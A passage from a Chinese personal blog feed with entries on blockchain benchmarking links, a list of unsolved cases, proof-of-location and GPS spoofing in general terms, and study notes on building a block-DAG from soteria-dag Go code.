src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1617603270275-99d16c67-3092-44b8-8db9-2012356b4c85.png#height=97&id=h4IoK&name=image.png&originHeight=193&originWidth=1487&originalType=binary&size=42228&status=done&style=none&width=743.5" alt="image.png"></p><h1 id="维护可信交易用到的技术栈"><a href="#维护可信交易用到的技术栈" class="headerlink" title="维护可信交易用到的技术栈"></a>维护可信交易用到的技术栈</h1><p>hashmap–用于快速查找<br>具体原理：<a href="https://zhuanlan.zhihu.com/p/27108356">https://zhuanlan.zhihu.com/p/27108356</a><br>测试性能：<a href="https://github.com/phf/go-hashmap">https://github.com/phf/go-hashmap</a> 那个测试的样式可以嫖一下</p><h1 id="测压-tps"><a href="#测压-tps" class="headerlink" title="测压 tps"></a>测压 tps</h1><p>【1】<a href="https://hyperledger.github.io/caliper/v0.3.2/architecture-ch/">https://hyperledger.github.io/caliper/v0.3.2/architecture-ch/</a><br>【2】<a href="https://blog.csdn.net/qq_44316726/article/details/108112300?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-0&spm=1001.2101.3001.4242">https://blog.csdn.net/qq_44316726/article/details/108112300?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-0&amp;spm=1001.2101.3001.4242</a><br>【3】<a href="https://zhuanlan.zhihu.com/p/133873895">https://zhuanlan.zhihu.com/p/133873895</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>未解悬案</title>
      <link href="/2021/%E6%9C%AA%E8%A7%A3%E6%82%AC%E6%A1%88/"/>
      <url>/2021/%E6%9C%AA%E8%A7%A3%E6%82%AC%E6%A1%88/</url>
      
        <content type="html"><![CDATA[<p>如果能发明时光机器，历史上的这些悬案就会水落石出吧。以下是我最关心的一些案子。</p><a id="more"></a><h1 id="南大碎尸案"><a href="#南大碎尸案" class="headerlink" title="南大碎尸案"></a>南大碎尸案</h1><p>究竟是谁作的案。</p><h1 id="章莹颖案"><a href="#章莹颖案" class="headerlink" title="章莹颖案"></a>章莹颖案</h1><p>杀人犯究竟把她埋在了哪里。</p><h1 id="马航-MH370-失踪案"><a href="#马航-MH370-失踪案" class="headerlink" title="马航 MH370 失踪案"></a>马航 MH370 失踪案</h1><p>马航在失事之前究竟发生了什么，它究竟在哪里坠海？<br>2021.12.2 似乎发现了它</p><h1 id="一卡通丢失案"><a href="#一卡通丢失案" class="headerlink" title="一卡通丢失案"></a>一卡通丢失案</h1><p>劳资的一卡通究竟丢在哪里了。</p><h1 id="开衫丢失案"><a href="#开衫丢失案" class="headerlink" title="开衫丢失案"></a>开衫丢失案</h1><p>衣服一定丢失在了酒店，但隔离酒店究竟找没找到？</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Proof-of-location</title>
      <link href="/2021/Proof-of-location/"/>
      <url>/2021/Proof-of-location/</url>
      
        <content type="html"><![CDATA[<p>位置证明，由于要依赖 IoT 设备，所以计划暂时搁置，如果时间允许可以扩展。</p><a id="more"></a><h1 id="为什么要位置证明？"><a href="#为什么要位置证明？" class="headerlink" title="为什么要位置证明？"></a>为什么要位置证明？</h1><p><a href="https://kuaibao.qq.com/s/20191106A0PYPS00?refer=spider">https://kuaibao.qq.com/s/20191106A0PYPS00?refer=spider</a><br>GPS（Global Positioning System，全球定位系统）是美国研制的卫星导航定位系统，定位器通过接收 GPS 卫星提供的经纬度坐标信号来进行定位。GPS 定位的精度（一般在几十米）往往会受到卫星的位置误差、信号干扰、接收器误差等因素影响。<br>GPS 的设计缺陷主要表现在以下几个方面：<br>一、系统功率低，信号强度弱；<br>二、GPS 信号易受电磁干扰，攻击者容易在锁定信号特征后实施转发式欺骗干扰攻击；<br>三、民用 GPS 缺乏必要的通信加密机制；<br>四、系统整体的自身完善和优化能力较弱。<br>五、城市密度增加信号多径<br>GPS 欺骗是指利用伪造信号欺骗其他接收器的行为。这种攻击会混淆 GPS 接收机对象的实际位置和时间，从而导致通信中断、金融交易混乱、电力系统瘫痪等。最严重的 GPS 欺骗甚至可以操纵信号，让飞机相撞。</p><p>位置证明允许用户和自主代理在自己选择的时间私下记录经过身份验证的位置数据，然后通过提交防欺诈的位置声明，自行披露自己的个人信息。</p><h1 id="相关"><a href="#相关" class="headerlink" title="相关"></a>相关</h1><p>【1】博文<a href="https://blog.foam.space/introduction-to-proof-of-location-6b4c77928022">https://blog.foam.space/introduction-to-proof-of-location-6b4c77928022</a><br>【2】白皮书<a href="https://www.yuque.com/attachments/yuque/0/2021/pdf/1629942/1616936190571-ac401ae5-3b34-41d2-be05-521b3ac5aa70.pdf?_lake_card=%7B%22src%22:%22https://www.yuque.com/attachments/yuque/0/2021/pdf/1629942/1616936190571-ac401ae5-3b34-41d2-be05-521b3ac5aa70.pdf%22,%22name%22:%22FOAM%20Techincal%20Whitepaper%20Draft.pdf%22,%22size%22:4415140,%22type%22:%22application/pdf%22,%22ext%22:%22pdf%22,%22status%22:%22done%22,%22uid%22:%221616936187787-0%22,%22progress%22:%7B%22percent%22:99%7D,%22percent%22:0,%22id%22:%22r1QEt%22,%22card%22:%22file%22%7D">FOAM Techincal Whitepaper Draft.pdf</a><br>【3】项目<a href="https://github.com/graphprotocol/FOAM-subgraph">https://github.com/graphprotocol/FOAM-subgraph</a><br>【4】IEEE <a href="https://ieeexplore.ieee.org/stamp/stamp.jsp?tp=&arnumber=8431966">Blockchain-based Proof of Locatio</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>搭建区块链网络</title>
      <link href="/2021/%E6%90%AD%E5%BB%BA%E5%8C%BA%E5%9D%97%E9%93%BE%E7%BD%91%E7%BB%9C/"/>
      <url>/2021/%E6%90%AD%E5%BB%BA%E5%8C%BA%E5%9D%97%E9%93%BE%E7%BD%91%E7%BB%9C/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="从零开始"><a href="#从零开始" class="headerlink" title="从零开始"></a>从零开始</h1><p>【1】<a href="https://github.com/omnigeeker/golang_blockchain_demo/tree/master/blockchain">https://github.com/omnigeeker/golang_blockchain_demo/tree/master/blockchain</a><br>这是第一个，当然，我还找到好几个不错的，都 star 了。<br>下载之后，需要放置到 GOPATH 的 src 目录下面，然后开始跑。</p><p>注意，定义端口的文件叫<code>.env</code>，需要放在这里，当时报错报的我都懵了。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1616903705092-eb040ef2-e211-434c-a2c1-27e75c9667d7.png#height=166&id=kcgh9&name=image.png&originHeight=332&originWidth=357&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&size=13594&status=done&style=none&title=&width=178.5" alt="image.png"><br>然后，运行起来是这样的。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1616903978333-917b06c4-fb2e-4897-a825-07ff5a7e26af.png#height=142&id=CcaX0&name=image.png&originHeight=283&originWidth=895&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&size=32187&status=done&style=none&title=&width=447.5" alt="image.png"><br>原文中说，可以发送一个 post 请求用来创建新的块，我试了一下，postman 不能用插件了，postwoman 无法调试本地地址？然后 curl 命令也是可以的，参考<a href="https://www.jianshu.com/p/9bd018253bed">https://www.jianshu.com/p/9bd018253bed</a>，然后另外一个插件<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1616904095287-f81eed6a-fc08-4ec7-9ded-74a9ccdd23c3.png#height=148&id=oXKMq&name=image.png&originHeight=295&originWidth=806&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&size=32785&status=done&style=none&title=&width=403" alt="image.png"><br>也不错。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1616904175832-884b4446-3c1f-4df5-bca4-cdf3e9bcaaea.png#height=341&id=o3BPd&name=image.png&originHeight=682&originWidth=908&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&size=56987&status=done&style=none&title=&width=454" alt="image.png"><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1616904253263-b87ff0fb-9ff2-4196-86c2-d5a434559bcd.png#height=330&id=G3ELB&name=image.png&originHeight=659&originWidth=892&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&size=62473&status=done&style=none&title=&width=446" alt="image.png"><br>完美。<br>当我们访问<a href="http://localhost:8000/">http://localhost:8000/</a>，可以看到：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1616904286585-4e03e1f1-4e49-41f1-96c8-272fa2397ceb.png#height=226&id=PNpA5&name=image.png&originHeight=451&originWidth=703&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&size=23406&status=done&style=none&title=&width=351.5" alt="image.png"></p><h1 id="搭建-block-DAG"><a href="#搭建-block-DAG" class="headerlink" title="搭建 block-DAG"></a>搭建 block-DAG</h1><p>网上这部分资料很少，只找到一个<a href="https://github.com/soteria-dag/soterd/tree/master/blockdag">https://github.com/soteria-dag/soterd/tree/master/blockdag</a>，还不确定可不可以利用，加油。<br>然后还有一个 python 版的<a href="https://github.com/AvivYaish/PHANTOM/tree/master/phantom">https://github.com/AvivYaish/PHANTOM/tree/master/phantom</a>，里面貌似实现了一个小型的 DAG 区块链，但是感觉写的代码好少，不确定能不能用。</p><h2 id="根据-soteria-dag-搭建"><a href="#根据-soteria-dag-搭建" class="headerlink" title="根据 soteria-dag 搭建"></a>根据 soteria-dag 搭建</h2><p>本模块除了搭建步骤记录，还包括，数据结构记录，类方法记录，调用关系记录，以及 DAG 前置知识。</p><h3 id="为什么用-BLOCK-DAG"><a href="#为什么用-BLOCK-DAG" class="headerlink" title="为什么用 BLOCK-DAG"></a>为什么用 BLOCK-DAG</h3><p>BlockDAG 提供了比特币设计的主要功能，包括（1）分散化；您可以在没有中间人的情况下将货币转移给其他人。（2）某种程度的匿名性；货币与你的真实身份没有直接联系。（3）无信任共识；区块链实施的规则允许您对陌生人所做的区块验证工作有一定程度的信任，并使更改区块和交易变得困难。<br>另外，还提供了：</p><ul><li>提高了事务吞吐量；</li><li>允许使用工作证明系统，提高区块开采的可访问性和公平性。</li><li>加密事务负载</li><li>可扩展性</li><li>轻巧</li><li>量子安全（使用三元或平衡三元计算，而不是经典计算机执行的标准二进制计算</li></ul><h3 id="DAG-Vs-Bitchain"><a href="#DAG-Vs-Bitchain" class="headerlink" title="DAG Vs Bitchain"></a>DAG Vs Bitchain</h3><ol><li>单链技术存在的几个问题</li></ol><p>效率问题：传统区块链技术基于区块，比特币的效率较低，每十分钟出一个块，6 个出块确认需要一个小时，整个网络同时只能有一条单链，基于 PoW 共识机制出块无法并发执行。<br>确定性问题：比特币和以太坊存在 51%算力攻击问题，基于 PoW 共识的最大问题就是没有一个确定的不可更改的最终状态；如果某群体控制 51%算力，并发起攻击，比特币体系会崩溃。<br>中心化问题：基于区块的 PoW 共识中，矿工一方面可以形成集中化的矿场集团，一方面，获得打包交易权的矿工拥有巨大权力，可以选择那些交易进入区块，哪些交易不被处理，这样的风险目前已经是事实存在。<br>能耗问题：由于传统区块链基于 PoW 算力工作量证明，达成共识机制，比特币的挖矿能耗已经和阿根廷整个国家的耗电量持平。<br>2.DAG 区块链的优势和价值<br>a.传统区块链需要矿工完成工作量证明（PoW)来执行每一笔交易，而 DAG 区块链能摆脱这样的限制。<br>b.在 DAG 系统中，交易指令能极快的扩散通知至全网，大部分双重支付的攻击尝试将会被系统捕捉到并立即拒绝执行。</p><p>二者区块结构示意图对比：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1616908860946-be7368d2-b3fa-4cd9-9b7d-8a3899e04937.png#height=224&id=zQyhh&name=image.png&originHeight=448&originWidth=645&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&size=15493&status=done&style=shadow&title=&width=322.5" alt="image.png"><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1616908870524-9b40f2d6-0c7c-4bbe-b54d-510dcc608329.png#height=220&id=cnjIc&name=image.png&originHeight=439&originWidth=654&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&size=17168&status=done&style=shadow&title=&width=327" alt="image.png"><br>其中<code>parent sub-header</code>包括：</p><ul><li>Version - A value that could be used to trigger different block evaluation rules</li><li>Parents count - The number of parents this block has</li><li>Parents - A list of parents</li></ul><h3 id="BLOCK-DAG-整体结构"><a href="#BLOCK-DAG-整体结构" class="headerlink" title="BLOCK-DAG 整体结构"></a>BLOCK-DAG 整体结构</h3><p>区块链系统架构分别由数据层、网络层、共识层、激励层、合约层和应用层组成。<br>此处需要一个 DAG 区块链的架构图，类似于传统区块链的架构图–共识层，激励层什么的</p><ul><li>创世区块：高度为 0 的 genesis 块（它没有父块，同一高度/代上没有其他块）</li><li>一个或多个区块连接到 genesis 区块（高度 1）</li><li>连接到这些块的一个或多个块</li></ul><p>拓扑结构如下：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1616912721520-33ef9da2-c62d-4d5a-97c2-99077a0b7d1b.png#height=184&id=KiuBx&name=image.png&originHeight=367&originWidth=685&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&size=62156&status=done&style=none&title=&width=342.5" alt="image.png"></p><blockquote><p>由 Yonatan Sompolinsky 提出，新产生的区块指向所有已知的分叉末端区块，即一个区块有多个父亲，此时<strong>区块链就从一条链变为多条分叉链共同组成的的结构。</strong></p></blockquote><p>这就形成了一个远离创世纪区块的区块结构，每个世代/高度都有一组区块远离创世纪区块。区块之间的连接不像区块链那样严格；您可以有多个父级，并且父级的高度不同（在一个上限内）。<br>没有任何块与之连接的块集称为 DAG 的“tips”。当挖掘新块时，这些块用作父块，当节点彼此同步时，这些块也被引用。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> BlockDAG <span class="hljs-keyword">struct</span> &#123;<br><span class="hljs-comment">// The following fields are set when the instance is created and can&#x27;t</span><br><span class="hljs-comment">// be changed afterwards, so there is no need to protect them with a</span><br><span class="hljs-comment">// separate mutex.</span><br><span class="hljs-comment">//checkpoints         []chaincfg.Checkpoint</span><br><span class="hljs-comment">//checkpointsByHeight map[int32]*chaincfg.Checkpoint</span><br>db           database.DB<br>chainParams  *chaincfg.Params<br>timeSource   MedianTimeSource<br>sigCache     *txscript.SigCache<br>indexManager IndexManager<br>hashCache    *txscript.HashCache<br><br><span class="hljs-comment">// The following fields are calculated based upon the provided chain</span><br><span class="hljs-comment">// parameters.  They are also set when the instance is created and</span><br><span class="hljs-comment">// can&#x27;t be changed afterwards, so there is no need to protect them with</span><br><span class="hljs-comment">// a separate mutex.</span><br>minRetargetTimespan <span class="hljs-keyword">int64</span> <span class="hljs-comment">// target timespan / adjustment factor</span><br>maxRetargetTimespan <span class="hljs-keyword">int64</span> <span class="hljs-comment">// target timespan * adjustment factor</span><br>blocksPerRetarget   <span class="hljs-keyword">int64</span> <span class="hljs-comment">// target timespan / target time per block</span><br><br><span class="hljs-comment">// chainLock protects concurrent access to the vast majority of the</span><br><span class="hljs-comment">// fields in this struct below this point.</span><br>chainLock sync.RWMutex<br><br><span class="hljs-comment">// These fields are related to the memory block index.  They both have</span><br><span class="hljs-comment">// their own locks, however they are often also protected by the chain</span><br><span class="hljs-comment">// lock to help prevent logic races when blocks are being processed.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// index houses the entire block index in memory.</span><br>index             *blockIndex<br>dView             *dagView<br>graph             *phantom.Graph<br>blueSet           *phantom.BlueSetCache<br>nodeOrder         []*chainhash.Hash<br>orderCache        *phantom.OrderCache<br><br><br><span class="hljs-comment">// These fields are related to checkpoint handling.  They are protected</span><br><span class="hljs-comment">// by the chain lock.</span><br><span class="hljs-comment">//nextCheckpoint *chaincfg.Checkpoint</span><br><span class="hljs-comment">//checkpointNode *blockNode</span><br><br><span class="hljs-comment">// The state is used as a fairly efficient way to cache information</span><br><span class="hljs-comment">// about the current best chain state that is returned to callers when</span><br><span class="hljs-comment">// requested.  It operates on the principle of MVCC such that any time a</span><br><span class="hljs-comment">// new block becomes the best block, the state pointer is replaced with</span><br><span class="hljs-comment">// a new struct and the old state is left untouched.  In this way,</span><br><span class="hljs-comment">// multiple callers can be pointing to different best chain states.</span><br><span class="hljs-comment">// This is acceptable for most callers because the state is only being</span><br><span class="hljs-comment">// queried at a specific point in time.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// In addition, some of the fields are stored in the database so the</span><br><span class="hljs-comment">// chain state can be quickly reconstructed on load.</span><br>stateLock     sync.RWMutex<br>stateSnapshot *BestState<br>dagSnapshot   *DAGState<br><br><span class="hljs-comment">// The following caches are used to efficiently keep track of the</span><br><span class="hljs-comment">// current deployment threshold state of each rule change deployment.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// This information is stored in the database so it can be quickly</span><br><span class="hljs-comment">// reconstructed on load.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// warningCaches caches the current deployment threshold state for blocks</span><br><span class="hljs-comment">// in each of the **possible** deployments.  This is used in order to</span><br><span class="hljs-comment">// detect when new unrecognized rule changes are being voted on and/or</span><br><span class="hljs-comment">// have been activated such as will be the case when older versions of</span><br><span class="hljs-comment">// the software are being used</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// deploymentCaches caches the current deployment threshold state for</span><br><span class="hljs-comment">// blocks in each of the actively defined deployments.</span><br>warningCaches    []thresholdStateCache<br>deploymentCaches []thresholdStateCache<br><br><span class="hljs-comment">// The following fields are used to determine if certain warnings have</span><br><span class="hljs-comment">// already been shown.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// unknownRulesWarned refers to warnings due to unknown rules being</span><br><span class="hljs-comment">// activated.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// unknownVersionsWarned refers to warnings due to unknown versions</span><br><span class="hljs-comment">// being mined.</span><br>unknownRulesWarned    <span class="hljs-keyword">bool</span><br>unknownVersionsWarned <span class="hljs-keyword">bool</span><br><br><span class="hljs-comment">// The notifications field stores a slice of callbacks to be executed on</span><br><span class="hljs-comment">// certain blockchain events.</span><br>notificationsLock sync.RWMutex<br>notifications     []NotificationCallback<br>&#125;<br></code></pre></td></tr></table></figure><p>并且使用“链视图”来存储链状态，</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// chainView provides a flat view of a specific branch of the block chain from</span><br><span class="hljs-comment">// its tip back to the genesis block and provides various convenience functions</span><br><span class="hljs-comment">// for comparing chains.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// For example, assume a block chain with a side chain as depicted below:</span><br><span class="hljs-comment">//   genesis -&gt; 1 -&gt; 2 -&gt; 3 -&gt; 4  -&gt; 5 -&gt;  6  -&gt; 7  -&gt; 8</span><br><span class="hljs-comment">//                         \-&gt; 4a -&gt; 5a -&gt; 6a</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// The chain view for the branch ending in 6a consists of:</span><br><span class="hljs-comment">//   genesis -&gt; 1 -&gt; 2 -&gt; 3 -&gt; 4a -&gt; 5a -&gt; 6a</span><br><span class="hljs-keyword">type</span> dagView <span class="hljs-keyword">struct</span> &#123;<br>mtx      sync.Mutex<br>dagTips  <span class="hljs-keyword">map</span>[*blockNode]<span class="hljs-keyword">struct</span>&#123;&#125;<br>nodes    [][]*blockNode<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="类方法"><a href="#类方法" class="headerlink" title="类方法"></a>类方法</h3><h4 id="BlockDAG"><a href="#BlockDAG" class="headerlink" title="BlockDAG"></a>BlockDAG</h4><p>Methods:</p><table><thead><tr><th>calcNextBlockVersion(prevNodes []*blockNode) (int32, error)</th></tr></thead><tbody><tr><td>calcNextParentVersion(prevNodes []*blockNode) (int32, error)</td></tr><tr><td>CalcNextBlockVersion() (int32, error)</td></tr><tr><td>CalcNextParentVersion() (int32, error)</td></tr><tr><td>warnUnknownRuleActivations(nodes []*blockNode) error</td></tr><tr><td>warnUnknownVersions(nodes []*blockNode) error</td></tr><tr><td>calcEasiestDifficulty(bits uint32, duration time.Duration) uint32</td></tr><tr><td>findPrevTestNetDifficulty(startNode *blockNode) uint32</td></tr><tr><td>calcNextRequiredDifficulty(lastNode *blockNode, newBlockTime time.Time) (uint32, error)</td></tr><tr><td>CalcNextRequiredDifficulty(timestamp time.Time) (uint32, error)</td></tr><tr><td>TargetDifficulty(blockHeight int32) (*big.Int, error)</td></tr><tr><td>FetchSpendJournal(targetBlock *soterutil.Block) ([]SpentTxOut, error)</td></tr><tr><td>createChainState() error</td></tr><tr><td>initChainState() error</td></tr><tr><td>BlocksByHeight(blockHeight int32) ([]*soterutil.Block, error)</td></tr><tr><td>BlockByHash(hash *chainhash.Hash) (*soterutil.Block, error)</td></tr><tr><td>FetchUtxoView(tx *soterutil.Tx) (*UtxoViewpoint, error)</td></tr><tr><td>FetchUtxoEntry(outpoint wire.OutPoint) (*UtxoEntry, error)</td></tr><tr><td>visitOrphan(hash _chainhash.Hash, order _[]chainhash.Hash, tempMark *map[chainhash.Hash]int, done *map[chainhash.Hash]int) error</td></tr><tr><td>HaveBlock(hash *chainhash.Hash) (bool, error)</td></tr><tr><td>IsKnownOrphan(hash *chainhash.Hash) bool</td></tr><tr><td>GetOrphanBlocks() []*soterutil.Block</td></tr><tr><td>GetOrphanChildren(parent *chainhash.Hash) []*soterutil.Block</td></tr><tr><td>GetOrphanLocator(hashes []chainhash.Hash) BlockLocator</td></tr><tr><td>GetOrphanOrder() ([]chainhash.Hash, error)</td></tr><tr><td>GetOrphanRoot(hash *chainhash.Hash) []chainhash.Hash</td></tr><tr><td>GetOrphans() []*orphanBlock</td></tr><tr><td>removeOrphanBlock(orphan *orphanBlock)</td></tr><tr><td>addOrphanBlock(block *soterutil.Block)</td></tr><tr><td>CalcSequenceLock(tx *soterutil.Tx, utxoView <em>UtxoViewpoint, mempool bool) (\</em>SequenceLock, error)</td></tr><tr><td>calcSequenceLock(nodes []*blockNode, tx *soterutil.Tx, utxoView *UtxoViewpoint, mempool bool) (*SequenceLock, error)</td></tr><tr><td>getAllInputTxos(block *soterutil.Block, view *UtxoViewpoint) ([]SpentTxOut, error)</td></tr><tr><td>connectBlock(node *blockNode, block <em>soterutil.Block, view \</em>UtxoViewpoint, stxos []SpentTxOut) error</td></tr><tr><td>connectBestChain(node *blockNode, block *soterutil.Block, flags BehaviorFlags) (bool, error)</td></tr><tr><td>isCurrent() bool</td></tr><tr><td>IsCurrent() bool</td></tr><tr><td>BestSnapshot() *BestState</td></tr><tr><td>DAGSnapshot() *DAGState</td></tr><tr><td>DAGColoring() []*chainhash.Hash</td></tr><tr><td>DAGOrdering() []*chainhash.Hash</td></tr><tr><td>HeaderByHash(hash *chainhash.Hash) (wire.BlockHeader, error)</td></tr><tr><td>MainChainHasBlock(hash *chainhash.Hash) bool</td></tr><tr><td>BlockLocatorFromHash(hash *chainhash.Hash) BlockLocator</td></tr><tr><td>BlockLocatorFromHeight(height int32) BlockLocator</td></tr><tr><td>LatestBlockLocator() (BlockLocator, error)</td></tr><tr><td>BlockHeightByHash(hash *chainhash.Hash) (int32, error)</td></tr><tr><td>BlockHashesByHeight(blockHeight int32) ([]chainhash.Hash, error)</td></tr><tr><td>HeightRange(startHeight int32, endHeight int32) ([]chainhash.Hash, error)</td></tr><tr><td>HeightToHashRange(startHeight int32, endHash *chainhash.Hash, maxResults int) ([]chainhash.Hash, error)</td></tr><tr><td>IntervalBlockHashes(endHash *chainhash.Hash, interval int) ([]chainhash.Hash, error)</td></tr><tr><td>locateInventory(locator BlockLocator, hashStop *chainhash.Hash, maxEntries uint32) []*blockNode</td></tr><tr><td>locateBlocks(locator BlockLocator, hashStop *chainhash.Hash, maxHashes uint32) []chainhash.Hash</td></tr><tr><td>LocateBlocks(locator BlockLocator, hashStop *chainhash.Hash, maxHashes uint32) []chainhash.Hash</td></tr><tr><td>locateHeaders(locator BlockLocator, hashStop *chainhash.Hash, maxHeaders uint32) []wire.BlockHeader</td></tr><tr><td>LocateHeaders(locator BlockLocator, hashStop *chainhash.Hash) []wire.BlockHeader</td></tr><tr><td>GetBlockDiff(subtips []*chainhash.Hash) []*chainhash.Hash</td></tr><tr><td>Subscribe(callback NotificationCallback)</td></tr><tr><td>sendNotification(typ NotificationType, data interface{})</td></tr><tr><td>checkBlockHeaderContext(header *wire.BlockHeader, prevNodes []*blockNode, flags BehaviorFlags) error</td></tr><tr><td>checkBlockContext(block *soterutil.Block, prevNodes []*blockNode, flags BehaviorFlags) error</td></tr><tr><td>checkBIP0030(node *blockNode, block <em>soterutil.Block, view \</em>UtxoViewpoint) error</td></tr><tr><td>checkConnectBlock(node *blockNode, block *soterutil.Block, view _UtxoViewpoint, stxos _[]SpentTxOut) error</td></tr><tr><td>CheckConnectBlockTemplate(block *soterutil.Block) error</td></tr><tr><td>RenderDot() ([]byte, error)</td></tr><tr><td>RenderSvg() ([]byte, error)</td></tr><tr><td>TstSetCoinbaseMaturity(maturity uint16)</td></tr><tr><td>thresholdStates(nodes []*blockNode, checker thresholdConditionChecker, cache *thresholdStateCache) ([]ThresholdState, error)</td></tr><tr><td>ThresholdStates(deploymentID uint32) ([]ThresholdState, error)</td></tr><tr><td>IsDeploymentActive(deploymentID uint32) (bool, error)</td></tr><tr><td>deploymentStates(prevNodes []*blockNode, deploymentID uint32) ([]ThresholdState, error)</td></tr><tr><td>initThresholdCaches() error</td></tr><tr><td>blockExists(hash *chainhash.Hash) (bool, error)</td></tr><tr><td>processOrphans(flags BehaviorFlags) (bool, error)</td></tr><tr><td>ProcessBlock(block *soterutil.Block, flags BehaviorFlags) (bool, bool, error)</td></tr><tr><td>maybeAcceptBlock(block *soterutil.Block, flags BehaviorFlags) (bool, error)</td></tr></tbody></table><h4 id="dagview"><a href="#dagview" class="headerlink" title="dagview"></a>dagview</h4><table><thead><tr><th>genesis() *blockNode</th></tr></thead><tbody><tr><td>Genesis() *blockNode</td></tr><tr><td>tips() []*blockNode</td></tr><tr><td>Tips() []*blockNode</td></tr><tr><td>addTip(node *blockNode)</td></tr><tr><td>AddTip(node *blockNode)</td></tr><tr><td>checkAndAddNode(height int32, node *blockNode) bool</td></tr><tr><td>removeTip(node *blockNode)</td></tr><tr><td>RemoveTip(node *blockNode)</td></tr><tr><td>containsAtHeight(height int32, node *blockNode) bool</td></tr><tr><td>height() int32</td></tr><tr><td>Height() int32</td></tr><tr><td>nodesByHeight(height int32) []*blockNode</td></tr><tr><td>NodesByHeight(height int32) []*blockNode</td></tr><tr><td>virtualHash() *chainhash.Hash</td></tr><tr><td>count() int</td></tr><tr><td>Equals(other *dagView) bool</td></tr><tr><td>contains(node *blockNode) bool</td></tr><tr><td>Contains(node *blockNode) bool</td></tr><tr><td>next(node *blockNode) *blockNode</td></tr><tr><td>Next(node *blockNode) *blockNode</td></tr><tr><td>blockLocator(node *blockNode) BlockLocator</td></tr><tr><td>BlockLocator(node *blockNode) BlockLocator</td></tr></tbody></table><h3 id="SPECTRE-共识协议"><a href="#SPECTRE-共识协议" class="headerlink" title="SPECTRE 共识协议"></a>SPECTRE 共识协议</h3><p>核心思想：<strong>丢弃主链概念，所有产生的区块共同构成账本，不丢弃任何一个区块，同时维护一个无冲突交易集合。</strong><br>只要是产生的区块就不会被丢弃，所有的区块都是有效的，所有区块共同组成账本，这样进一步提高了区块链的处理交易能力，<strong>该设计的关键在于设计算法来保证区块链不会被恶意攻击成功。</strong></p><h4 id="如何产生区块"><a href="#如何产生区块" class="headerlink" 